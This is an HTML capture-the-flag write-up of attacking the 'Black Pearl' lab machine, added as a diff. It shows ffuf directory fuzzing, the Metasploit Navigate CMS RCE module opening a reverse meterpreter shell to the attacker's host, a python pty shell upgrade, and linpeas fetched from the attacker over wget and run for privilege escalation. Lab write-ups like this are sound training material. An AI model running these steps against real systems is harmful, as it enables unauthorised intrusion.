@@ -1,0 +1,161 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>blackperal.tcm ffuf</title>
+</head><body>Priority of etc/hosts file is more than DNS (i.e. Its primary present-day use is to bypass DNS resolution. A match found in the /etc/hosts file will be used before any DNS entry. <br/>
+In fact, if the name searched (like localhost) is found in the file, no DNS resolution will be performed at all.)<br/>
+<a href="https://unix.stackexchange.com/questions/421491/what-is-the-purpose-of-etc-hosts/421500#421500">https://unix.stackexchange.com/questions/421491/what-is-the-purpose-of-etc-hosts/421500#421500</a><br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ <br/>
+<br/>
+    /'___\ /'___\      /'___\    <br/>
+   /\ \__/ /\ \__/ __ __ /\ \__/    <br/>
+   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\   <br/>
+    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/   <br/>
+    \ \_\  \ \_\ \ \____/ \ \_\    <br/>
+     \/_/  \/_/  \/___/  \/_/    <br/>
+<br/>
+   v1.5.0 Kali Exclusive &lt;3<br/>
+________________________________________________<br/>
+<br/>
+:: Method      : GET<br/>
+:: URL       : http://blackpearl.tcm/FUZZ<br/>
+:: Wordlist     : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br/>
+:: Follow redirects : false<br/>
+:: Calibration   : false<br/>
+:: Timeout     : 10<br/>
+:: Threads     : 40<br/>
+:: Matcher     : Response status: 200,204,301,302,307,401,403,405,500<br/>
+________________________________________________<br/>
+<br/>
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 41ms]<br/>
+            [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 43ms]<br/>
+# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 41ms]<br/>
+#            [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 72ms]<br/>
+#            [Status: 200, Size: 86808, Words: 4215, Lines: 1040, Duration: 74ms]<br/>
+# directory-list-2.3-medium.txt [Status: 200, Size: 86808, Words: 4215, Lines: 1040, Duration: 79ms]<br/>
+# on atleast 2 different hosts [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 82ms]<br/>
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 116ms]<br/>
+# Copyright 2007 James Fisher [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 125ms]<br/>
+#            [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 130ms]<br/>
+# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 86808, Words: 4215, Lines: 1040, Duration: 125ms]<br/>
+# Priority ordered case sensative list, where entries were found [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 72ms]<br/>
+#            [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 58ms]<br/>
+# This work is licensed under the Creative Commons [Status: 200, Size: 86808, Words: 4215, Lines: 1040, Duration: 118ms]<br/>
+<b>navigate        [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 3ms]</b><br/>
+            [Status: 200, Size: 86809, Words: 4215, Lines: 1040, Duration: 17ms]<br/>
+:: Progress: [220560/220560] :: Job [1/1] :: 4320 req/sec :: Duration: [0:00:58] :: Errors: 0 ::<br/>
+<br/>
+Vola we are able to get a login page named navigatetcm.com<br/>
+Browser : http://blackpearl.tcm/navigate/login.php<br/>
+<br/>
+<img height="334" src="image.png" width="700"/><br/>
+<br/>
+So the go to tool is GOOGLE where we will search the navigate cms exploit and were able to find these 2 website<br/>
+<a href="https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/"><b>https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/</b></a><br/>
+<a href="https://www.exploit-db.com/exploits/45561">https://www.exploit-db.com/exploits/45561</a><br/>
+<br/>
+So will use the Msfconsole<br/>
+msf6 &gt; <b>use exploit/multi/http/navigate_cms_rce</b><br/>
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br/>
+msf6 exploit(multi/http/navigate_cms_rce) &gt;<br/>
+<br/>
+msf6 exploit(multi/http/navigate_cms_rce) &gt; set rhosts 192.168.205.134<br/>
+rhosts =&gt; 192.168.205.134<br/>
+msf6 exploit(multi/http/navigate_cms_rce) &gt; set vhost blackpearl.tcm<br/>
+vhost =&gt; blackpearl.tcm<br/>
+<br/>
+As we can see that we got a meterpreter shell but we need tty shell<br/>
+msf6 exploit(multi/http/navigate_cms_rce) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 192.168.205.128:4444 <br/>
+[+] Login bypass successful<br/>
+[+] Upload successful<br/>
+[*] Triggering payload...<br/>
+[*] Sending stage (39927 bytes) to 192.168.205.134<br/>
+[*] Meterpreter session 1 opened (192.168.205.128:4444 -&gt; 192.168.205.134:35406) at 2022-12-15 11:16:35 +0530<br/>
+whoami<br/>
+<br/>
+meterpreter &gt;shell<br/>
+<br/>
+Will Google for the TTY shell and the quickest way to do is with python and luckily python is installed in the victim machine.<br/>
+<a href="https://rcenetsec.com/shell-spawning/">https://rcenetsec.com/shell-spawning/</a><br/>
+<br/>
+<b>Command : python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' <br/>
+<br/>
+</b>meterpreter &gt; shell<br/>
+Process 803 created.<br/>
+Channel 1 created.<br/>
+whoami<br/>
+www-data<br/>
+which python<br/>
+/usr/bin/python<br/>
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' <br/>
+www-data@blackpearl:~/blackpearl.tcm/navigate$ whoami<br/>
+whoami<br/>
+www-data<br/>
+www-data@blackpearl:~/blackpearl.tcm/navigate$ sudo -l<br/>
+sudo -l<br/>
+bash: sudo: command not found<br/>
+www-data@blackpearl:~/blackpearl.tcm/navigate$ <b><br/>
+</b><br/>
+Now we have to check for privilege escalation using Linpeas<br/>
+Kali Linux <br/>
+┌──(root㉿kali)-[~]<br/>
+└─# cd transfer <br/>
+                                                                              <br/>
+┌──(root㉿kali)-[~/transfer]<br/>
+└─# ls<br/>
+linpeas.sh pspy64 winpeas.exe Wise.exe<br/>
+                                                                              <br/>
+┌──(root㉿kali)-[~/transfer]<br/>
+└─# python3 -m http.server 80<br/>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br/>
+<br/>
+Bash Shell <br/>
+www-data@blackpearl:~/blackpearl.tcm/navigate$ cd /tmp <br/>
+cd /tmp<br/>
+www-data@blackpearl:/tmp$ ls<br/>
+ls<br/>
+systemd-private-1fd66986dca54aa6a4394f0a226c17f4-systemd-timesyncd.service-ECr4S6<br/>
+www-data@blackpearl:/tmp$ wget http://192.168.205.128/linpeas.sh linpeas.sh<br/>
+wget http://192.168.205.128/linpeas.sh linpeas.sh<br/>
+--2022-12-15 00:57:03-- http://192.168.205.128/linpeas.sh<br/>
+Connecting to 192.168.205.128:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 807167 (788K) [text/x-sh]<br/>
+Saving to: 'linpeas.sh'<br/>
+<br/>
+linpeas.sh     100%[===================&gt;] 788.25K --.-KB/s  in 0.1s  <br/>
+<br/>
+2022-12-15 00:57:03 (5.58 MB/s) - 'linpeas.sh' saved [807167/807167]<br/>
+<br/>
+--2022-12-15 00:57:03-- http://linpeas.sh/<br/>
+Resolving linpeas.sh (linpeas.sh)... 172.67.148.155, 104.21.89.223, 2606:4700:3035::6815:59df, ...<br/>
+Connecting to linpeas.sh (linpeas.sh)|172.67.148.155|:80... connected.<br/>
+HTTP request sent, awaiting response... 301 Moved Permanently<br/>
+Location: https://linpeas.sh/ [following]<br/>
+--2022-12-15 00:57:05-- https://linpeas.sh/<br/>
+Connecting to linpeas.sh (linpeas.sh)|172.67.148.155|:443... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: unspecified [text/html]<br/>
+Saving to: 'index.html'<br/>
+<br/>
+index.html       [ &lt;=&gt;        ] 753.46K --.-KB/s  in 0.1s  <br/>
+<br/>
+2022-12-15 00:57:06 (5.07 MB/s) - 'index.html' saved [771544]<br/>
+<br/>
+FINISHED --2022-12-15 00:57:06--<br/>
+Total wall clock time: 3.5s<br/>
+Downloaded: 2 files, 1.5M in 0.3s (5.32 MB/s)<br/>
+www-data@blackpearl:/tmp$ ls<br/>
+ls<br/>
+index.html<br/>
+linpeas.sh<br/>
+systemd-private-1fd66986dca54aa6a4394f0a226c17f4-systemd-timesyncd.service-ECr4S6<br/>
+www-data@blackpearl:/tmp$ chmod +x linpeas.sh<br/>
+chmod +x linpeas.sh<br/>
+www-data@blackpearl:/tmp$ ./linpeas.sh<br/>
+<br/>
+</body></html>
